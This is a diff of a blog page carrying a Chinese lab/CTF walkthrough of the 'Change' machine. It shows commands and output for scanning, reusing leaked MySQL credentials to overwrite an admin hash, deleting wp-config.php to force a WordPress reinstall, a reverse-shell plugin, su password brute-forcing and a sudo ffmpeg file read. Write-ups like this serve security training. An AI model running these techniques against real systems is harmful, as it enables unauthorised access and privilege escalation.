@@ -30,7 +30,7 @@
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Change.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>内部_Change</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -54,17 +54,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-.copy-feedback {
-    display: none;
-    position: absolute;
-    top: 10px;
-    right: 50px;
-    color: var(--color-fg-on-emphasis);
-    background-color: var(--color-fg-muted);
-    border-radius: 3px;
-    padding: 5px 8px;
-    font-size: 12px;
-}
+
 </style>
 
 
@@ -96,11 +86,11 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
 </div>
     <div id="content">
-<div class="markdown-body" id="postBody"><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2f31ebaa5cfe5b14358f83a32069ccd95ea0ef7c84925fa09b081ca0d14a9020/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303732313232313535363338342e77656270"><img src="https://camo.githubusercontent.com/2f31ebaa5cfe5b14358f83a32069ccd95ea0ef7c84925fa09b081ca0d14a9020/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303732313232313535363338342e77656270" alt="image" data-canonical-src="https://7r1UMPHK.github.io/image/20250721221556384.webp" style="max-width: 100%;"></a></p>
+<div class="markdown-body" id="postBody"><p><img src="https://7r1UMPHK.github.io/image/20250721221556384.webp" alt="image" /></p>
 <h1>一、信息收集</h1>
 <h1>1. 主机发现</h1>
-<p>首先，在内网环境中使用 <code class="notranslate">arp-scan</code> 工具扫描本地网络，以发现存活的主机。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>首先，在内网环境中使用 <code>arp-scan</code> 工具扫描本地网络，以发现存活的主机。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ sudo arp-scan -l
 Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
@@ -108,14 +98,15 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
 192.168.205.202 08:00:27:7d:c4:83       PCS Systemtechnik GmbH
 192.168.205.254 00:50:56:fc:a8:ce       VMware, Inc.
-...</pre></div>
-<p>扫描结果显示目标主机的 IP 地址为 <code class="notranslate">192.168.205.202</code>。</p>
+...
+</code></pre>
+<p>扫描结果显示目标主机的 IP 地址为 <code>192.168.205.202</code>。</p>
 <h2>2. 端口与服务扫描</h2>
-<p>确定目标 IP 后，使用 <code class="notranslate">nmap</code> 对其进行详细的端口扫描，探测其开放的端口和服务。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>确定目标 IP 后，使用 <code>nmap</code> 对其进行详细的端口扫描，探测其开放的端口和服务。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nmap -p- 192.168.205.202
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 10:13 EDT
-Nmap scan report <span class="pl-k">for</span> 192.168.205.202
+Nmap scan report for 192.168.205.202
 Host is up (0.00010s latency).
 Not shown: 65532 closed tcp ports (reset)
 PORT     STATE SERVICE
@@ -124,79 +115,91 @@ PORT     STATE SERVICE
 3306/tcp open  mysql
 MAC Address: 08:00:27:7D:C4:83 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
-Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.28 seconds<span class="pl-s"><span class="pl-pds">`</span><span class="pl-pds">`</span><span class="pl-pds">`</span></span>
-<span class="pl-s"></span>
-<span class="pl-s">扫描发现目标开放了三个服务端口：SSH (22), HTTP (80) 和 MySQL (3306)。</span></pre></div>
+Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds```
+
+扫描发现目标开放了三个服务端口：SSH (22), HTTP (80) 和 MySQL (3306)。
+</code></pre>
 <h1>二、初始访问</h1>
 <h2>1. Web 应用枚举</h2>
-<p>访问 80 端口的 Web 服务，页面提示我们访问域名 <code class="notranslate">change.dsz</code>。我们将该域名与目标 IP 的映射关系添加到本地 <code class="notranslate">/etc/hosts</code> 文件中。</p>
-<p>使用 <code class="notranslate">wfuzz</code> 对子域名进行模糊测试，发现了一个新的子域名 <code class="notranslate">wordpress.change.dsz</code>。</p>
-<p>接着使用 <code class="notranslate">gobuster</code> 对 <code class="notranslate">http://change.dsz</code> 进行目录扫描，发现 <code class="notranslate">login.php</code>, <code class="notranslate">admin.php</code>, <code class="notranslate">db.php</code> 等文件。</p>
+<p>访问 80 端口的 Web 服务，页面提示我们访问域名 <code>change.dsz</code>。我们将该域名与目标 IP 的映射关系添加到本地 <code>/etc/hosts</code> 文件中。</p>
+<p>使用 <code>wfuzz</code> 对子域名进行模糊测试，发现了一个新的子域名 <code>wordpress.change.dsz</code>。</p>
+<p>接着使用 <code>gobuster</code> 对 <code>http://change.dsz</code> 进行目录扫描，发现 <code>login.php</code>, <code>admin.php</code>, <code>db.php</code> 等文件。</p>
 <h2>2. 信息泄露与数据库访问</h2>
-<p>在 <code class="notranslate">login.php</code> 页面的 HTML 源码中，发现了一段注释，泄露了数据库的连接凭据。</p>
-<div class="highlight highlight-text-html-basic"><pre class="notranslate"><span class="pl-c">&lt;!-- Database connection settings:</span>
-<span class="pl-c">Host=localhost, DB=changeweb</span>
-<span class="pl-c">User=change, Password=change --&gt;</span></pre></div>
-<p>我们使用这组凭据 (<code class="notranslate">change:change</code>) 成功连接到目标的 MySQL 服务。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>在 <code>login.php</code> 页面的 HTML 源码中，发现了一段注释，泄露了数据库的连接凭据。</p>
+<pre lang="html"><code>&lt;!-- Database connection settings:
+Host=localhost, DB=changeweb
+User=change, Password=change --&gt;
+</code></pre>
+<p>我们使用这组凭据 (<code>change:change</code>) 成功连接到目标的 MySQL 服务。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ mysql -h 192.168.205.202 -u change -pchange --skip-ssl
 Welcome to the MariaDB monitor. ...
 ...
-MariaDB [changeweb]<span class="pl-k">&gt;</span> <span class="pl-k">select</span> <span class="pl-smi">*</span> from users<span class="pl-k">;</span>
+MariaDB [changeweb]&gt; select * from users;
 +----+----------+--------------------------------------------------------------+
-<span class="pl-k">|</span> id <span class="pl-k">|</span> username <span class="pl-k">|</span> password                                                     <span class="pl-k">|</span>
+| id | username | password                                                     |
 +----+----------+--------------------------------------------------------------+
-<span class="pl-k">|</span>  1 <span class="pl-k">|</span> root     <span class="pl-k">|</span> <span class="pl-smi">$2</span>y<span class="pl-smi">$1</span>0<span class="pl-smi">$EFCK8LdjkDv1W52q0bV8</span>.OLUicO8h6kYBqU5nE1jOcSq3qQ9l5mZG <span class="pl-k">|</span>
-+----+----------+--------------------------------------------------------------+</pre></div>
-<p>在 <code class="notranslate">changeweb</code> 数据库的 <code class="notranslate">users</code> 表中，我们发现了 <code class="notranslate">root</code> 用户的密码哈希。</p>
+|  1 | root     | $2y$10$EFCK8LdjkDv1W52q0bV8.OLUicO8h6kYBqU5nE1jOcSq3qQ9l5mZG |
++----+----------+--------------------------------------------------------------+
+</code></pre>
+<p>在 <code>changeweb</code> 数据库的 <code>users</code> 表中，我们发现了 <code>root</code> 用户的密码哈希。</p>
 <h2>3. 获取立足点</h2>
-<p>通过 <code class="notranslate">SHOW GRANTS</code> 命令查询可知，<code class="notranslate">change</code> 用户拥有对 <code class="notranslate">changeweb</code> 数据库的全部权限，这意味着我们可以修改表中的数据。我们本地生成一个新的密码哈希（密码为 <code class="notranslate">1</code>），并更新 <code class="notranslate">users</code> 表中的 <code class="notranslate">root</code> 用户密码。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 在攻击机上生成密码哈希</span>
+<p>通过 <code>SHOW GRANTS</code> 命令查询可知，<code>change</code> 用户拥有对 <code>changeweb</code> 数据库的全部权限，这意味着我们可以修改表中的数据。我们本地生成一个新的密码哈希（密码为 <code>1</code>），并更新 <code>users</code> 表中的 <code>root</code> 用户密码。</p>
+<pre lang="bash"><code># 在攻击机上生成密码哈希
 ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ php -r <span class="pl-s"><span class="pl-pds">'</span>echo password_hash("1", PASSWORD_DEFAULT);<span class="pl-pds">'</span></span>
-<span class="pl-smi">$2</span>y<span class="pl-smi">$1</span>2<span class="pl-smi">$l22u4aCvdoTp</span>.g5g4RTBheEeHiBFzCFUK3pi1cJkGQY39OjKE/HTG
+└─$ php -r 'echo password_hash(&quot;1&quot;, PASSWORD_DEFAULT);'
+$2y$12$l22u4aCvdoTp.g5g4RTBheEeHiBFzCFUK3pi1cJkGQY39OjKE/HTG
 
-<span class="pl-c"><span class="pl-c">#</span> 在数据库中更新密码</span>
-MariaDB [changeweb]<span class="pl-k">&gt;</span> UPDATE users SET password = <span class="pl-s"><span class="pl-pds">'</span>$2y$12$l22u4aCvdoTp.g5g4RTBheEeHiBFzCFUK3pi1cJkGQY39OjKE/HTG<span class="pl-pds">'</span></span> WHERE username = <span class="pl-s"><span class="pl-pds">'</span>root<span class="pl-pds">'</span></span><span class="pl-k">;</span></pre></div>
-<p>使用 <code class="notranslate">root:1</code> 成功登录后台 <code class="notranslate">admin.php</code>，发现这是一个命令执行页面，但功能受限，只允许执行 <code class="notranslate">ls</code>, <code class="notranslate">rm</code>, <code class="notranslate">pwd</code> 等少数命令。</p>
-<p>我们的目标是 <code class="notranslate">wordpress.change.dsz</code>。利用已知漏洞，如果 WordPress 的 <code class="notranslate">wp-config.php</code> 文件被删除，再次访问网站会触发重新安装流程。利用 <code class="notranslate">admin.php</code> 的 <code class="notranslate">rm</code> 命令执行权限，我们删除了该配置文件。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 在 admin.php 页面执行</span>
-rm ../wordpress.change.dsz/wp-config.php</pre></div>
-<p>刷新 <code class="notranslate">http://wordpress.change.dsz/</code>，果然进入了 WordPress 的安装界面。我们利用已掌握的 <code class="notranslate">changeweb</code> 数据库凭据完成了安装，并设置了一个新的管理员账户。</p>
-<p>登录 WordPress 后台后，我们上传并激活了一个包含反向 Shell 的恶意插件，成功在本地 <code class="notranslate">nc</code> 监听器上接收到了一个 <code class="notranslate">www-data</code> 用户的 Shell。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+# 在数据库中更新密码
+MariaDB [changeweb]&gt; UPDATE users SET password = '$2y$12$l22u4aCvdoTp.g5g4RTBheEeHiBFzCFUK3pi1cJkGQY39OjKE/HTG' WHERE username = 'root';
+</code></pre>
+<p>使用 <code>root:1</code> 成功登录后台 <code>admin.php</code>，发现这是一个命令执行页面，但功能受限，只允许执行 <code>ls</code>, <code>rm</code>, <code>pwd</code> 等少数命令。</p>
+<p>我们的目标是 <code>wordpress.change.dsz</code>。利用已知漏洞，如果 WordPress 的 <code>wp-config.php</code> 文件被删除，再次访问网站会触发重新安装流程。利用 <code>admin.php</code> 的 <code>rm</code> 命令执行权限，我们删除了该配置文件。</p>
+<pre lang="bash"><code># 在 admin.php 页面执行
+rm ../wordpress.change.dsz/wp-config.php
+</code></pre>
+<p>刷新 <code>http://wordpress.change.dsz/</code>，果然进入了 WordPress 的安装界面。我们利用已掌握的 <code>changeweb</code> 数据库凭据完成了安装，并设置了一个新的管理员账户。</p>
+<p>登录 WordPress 后台后，我们上传并激活了一个包含反向 Shell 的恶意插件，成功在本地 <code>nc</code> 监听器上接收到了一个 <code>www-data</code> 用户的 Shell。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nc -lvnp 8888
 listening on [any] 8888 ...
 connect to [192.168.205.128] from (UNKNOWN) [192.168.205.202] 47432
 ...
-uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre></div>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
 <h1>三、权限提升</h1>
-<h2>1. 提权至 <code class="notranslate">lzh</code> 用户</h2>
-<p>在 <code class="notranslate">www-data</code> 的 Shell 中，我们在 <code class="notranslate">/home/lzh/</code> 目录下发现了一个名为 <code class="notranslate">.pass.txt</code> 的密码字典文件和一个 <code class="notranslate">user.txt</code>。</p>
-<p>我们将密码爆破工具 <code class="notranslate">suForce</code> 上传到目标服务器的 <code class="notranslate">/tmp</code> 目录，并使用 <code class="notranslate">.pass.txt</code> 作为字典，对本地用户 <code class="notranslate">lzh</code> 进行密码爆破。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Change:/tmp$ ./suForce -u lzh -w /home/lzh/.pass.txt
+<h2>1. 提权至 <code>lzh</code> 用户</h2>
+<p>在 <code>www-data</code> 的 Shell 中，我们在 <code>/home/lzh/</code> 目录下发现了一个名为 <code>.pass.txt</code> 的密码字典文件和一个 <code>user.txt</code>。</p>
+<p>我们将密码爆破工具 <code>suForce</code> 上传到目标服务器的 <code>/tmp</code> 目录，并使用 <code>.pass.txt</code> 作为字典，对本地用户 <code>lzh</code> 进行密码爆破。</p>
+<pre lang="bash"><code>www-data@Change:/tmp$ ./suForce -u lzh -w /home/lzh/.pass.txt
 ...
-💥 Password <span class="pl-k">|</span> 1a2b3c4d1a2b3c4d
-...</pre></div>
-<p>成功破解出 <code class="notranslate">lzh</code> 用户的密码为 <code class="notranslate">1a2b3c4d1a2b3c4d</code>。我们使用该凭据通过 SSH 登录，获得了 <code class="notranslate">lzh</code> 用户的 Shell，并读取了第一个 flag。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">lzh@Change:<span class="pl-k">~</span>$ cat user.txt
-flag{user-a05597ed1f36976e88c2e10a74902c52}</pre></div>
-<h2>2. 提权至 <code class="notranslate">root</code></h2>
-<p>成为 <code class="notranslate">lzh</code> 用户后，我们检查其 <code class="notranslate">sudo</code> 权限。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">lzh@Change:<span class="pl-k">~</span>$ sudo -l
+💥 Password | 1a2b3c4d1a2b3c4d
+...
+</code></pre>
+<p>成功破解出 <code>lzh</code> 用户的密码为 <code>1a2b3c4d1a2b3c4d</code>。我们使用该凭据通过 SSH 登录，获得了 <code>lzh</code> 用户的 Shell，并读取了第一个 flag。</p>
+<pre lang="bash"><code>lzh@Change:~$ cat user.txt
+flag{user-a05597ed1f36976e88c2e10a74902c52}
+</code></pre>
+<h2>2. 提权至 <code>root</code></h2>
+<p>成为 <code>lzh</code> 用户后，我们检查其 <code>sudo</code> 权限。</p>
+<pre lang="bash"><code>lzh@Change:~$ sudo -l
 ...
 User lzh may run the following commands on Change:
-    (ALL) NOPASSWD: /usr/bin/ffmpeg</pre></div>
-<p>结果显示，<code class="notranslate">lzh</code> 用户可以无需密码以 <code class="notranslate">root</code> 权限执行 <code class="notranslate">/usr/bin/ffmpeg</code> 命令。<code class="notranslate">ffmpeg</code> 是一个功能强大的多媒体处理工具，其 <code class="notranslate">drawtext</code> 滤镜可以读取指定文件的内容并将其渲染到视频或图片上。我们可以利用此特性读取任意文件。</p>
-<p>我们构造 <code class="notranslate">ffmpeg</code> 命令，将 <code class="notranslate">/root/root.txt</code> 的内容作为文本，绘制到一个新的图片文件 <code class="notranslate">/tmp/flag.png</code> 中。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">lzh@Change:/tmp$ sudo /usr/bin/ffmpeg -f lavfi -i <span class="pl-s"><span class="pl-pds">"</span>nullsrc<span class="pl-pds">"</span></span> -vf <span class="pl-s"><span class="pl-pds">"</span>drawtext=fontfile=/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf:textfile=/root/root.txt:fontsize=24:fontcolor=white<span class="pl-pds">"</span></span> -frames:v 1 /tmp/flag.png</pre></div>
-<p>命令成功执行后，在 <code class="notranslate">/tmp</code> 目录下生成了 <code class="notranslate">flag.png</code>。我们在该目录下开启一个临时的 Python HTTP 服务器。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">lzh@Change:/tmp$ python3 -m http.server 8000
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</pre></div>
-<p>最后，在我们的攻击机上通过浏览器访问 <code class="notranslate">http://192.168.205.202:8000/flag.png</code>，图片上清晰地显示了 <code class="notranslate">root</code> flag 的内容。</p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/db08702e795a865fe16790d79fdd0c32acfaa2632919dc9f6c6a11d6f94dbb6d/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303732313232353030313232392e77656270"><img src="https://camo.githubusercontent.com/db08702e795a865fe16790d79fdd0c32acfaa2632919dc9f6c6a11d6f94dbb6d/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303732313232353030313232392e77656270" alt="image" data-canonical-src="https://7r1UMPHK.github.io/image/20250721225001229.webp" style="max-width: 100%;"></a></p>
+    (ALL) NOPASSWD: /usr/bin/ffmpeg
+</code></pre>
+<p>结果显示，<code>lzh</code> 用户可以无需密码以 <code>root</code> 权限执行 <code>/usr/bin/ffmpeg</code> 命令。<code>ffmpeg</code> 是一个功能强大的多媒体处理工具，其 <code>drawtext</code> 滤镜可以读取指定文件的内容并将其渲染到视频或图片上。我们可以利用此特性读取任意文件。</p>
+<p>我们构造 <code>ffmpeg</code> 命令，将 <code>/root/root.txt</code> 的内容作为文本，绘制到一个新的图片文件 <code>/tmp/flag.png</code> 中。</p>
+<pre lang="bash"><code>lzh@Change:/tmp$ sudo /usr/bin/ffmpeg -f lavfi -i &quot;nullsrc&quot; -vf &quot;drawtext=fontfile=/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf:textfile=/root/root.txt:fontsize=24:fontcolor=white&quot; -frames:v 1 /tmp/flag.png
+</code></pre>
+<p>命令成功执行后，在 <code>/tmp</code> 目录下生成了 <code>flag.png</code>。我们在该目录下开启一个临时的 Python HTTP 服务器。</p>
+<pre lang="bash"><code>lzh@Change:/tmp$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+<p>最后，在我们的攻击机上通过浏览器访问 <code>http://192.168.205.202:8000/flag.png</code>，图片上清晰地显示了 <code>root</code> flag 的内容。</p>
+<p><img src="https://7r1UMPHK.github.io/image/20250721225001229.webp" alt="image" /></p>
 <h1>四、获取所有 Flag</h1>
-<p>至此，我们成功获取了系统上的所有 flag。</p></div>
+<p>至此，我们成功获取了系统上的所有 flag。</p>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -221,7 +224,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -268,70 +271,7 @@ function iFrameLoading(){
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const createClipboardHTML = (codeContent, additionalClasses = '') => `
-        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
-        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
-            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
-                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
-                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
-            </clipboard-copy>
-            <div class="copy-feedback">Copied!</div>
-        </div>
-    `;
 
-    const handleCodeElements = (selector = '') => {
-        document.querySelectorAll(selector).forEach(codeElement => {
-            const codeContent = codeElement.innerHTML;
-            const newStructure = document.createElement('div');
-            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
-            newStructure.innerHTML = createClipboardHTML(codeContent);
-
-            const parentElement = codeElement.parentElement;
-            if (selector.includes('highlight')) {
-                parentElement.insertBefore(newStructure, codeElement.nextSibling);
-                parentElement.removeChild(codeElement);
-            } else {
-                parentElement.parentElement.replaceChild(newStructure, parentElement);
-            }
-        });
-    };
-
-    handleCodeElements('pre.notranslate > code.notranslate');
-    handleCodeElements('div.highlight > pre.notranslate');
-
-    let currentFeedback = null;
-    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
-        copyButton.addEventListener('click', () => {
-            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = codeContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-
-            const copyIcon = copyButton.querySelector('.octicon-copy');
-            const checkIcon = copyButton.querySelector('.octicon-check');
-            const copyFeedback = copyButton.nextElementSibling;
-
